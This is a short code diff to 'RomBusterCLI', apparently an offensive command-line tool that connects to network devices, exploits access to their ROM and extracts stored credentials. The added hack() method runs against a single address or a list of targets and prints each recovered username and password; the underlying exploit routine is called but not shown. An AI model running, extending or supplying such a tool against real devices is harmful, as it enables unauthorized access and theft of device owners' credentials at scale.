@@ -37,16 +37,33 @@ class RomBusterCLI(Exploit, Badges):
     parser.add_argument('--address', dest='address', help='Address.')
     args = parser.parse_args()
 
+    def hack(self, host):
+        self.print_process(f"({host}) - connecting to device ...")
+        response = self.connect(host)
+
+        if response is not None:
+            self.print_process(f"({host}) - accessing rom ...")
+            creds = self.exploit(response)
+
+            if creds is not None:
+                self.print_process(f"({host}) - extracting credentials ...")
+                for username in creds.keys():
+                    self.print_information(f"({host}) - {username}:{creds[username]}")
+            else:
+                self.print_error(f"({host}) - rom access denied!")
+        else:
+            self.print_error(f"({host}) - connection rejected!")
+
     def start(self):
         if self.args.list:
             with open(self.args.list, 'r') as f:
                 lines = f.read().strip().split('\n')
                 for line in lines:
-                    self.exploit(line)
+                    self.hack(line)
             for credential in self.credentials:
                 self.print_success(credential)
         elif self.args.address:
-            self.exploit(self.args.address)
+            self.hack(self.args.address)
             for credential in self.credentials:
                 self.print_information(credential)
         else:
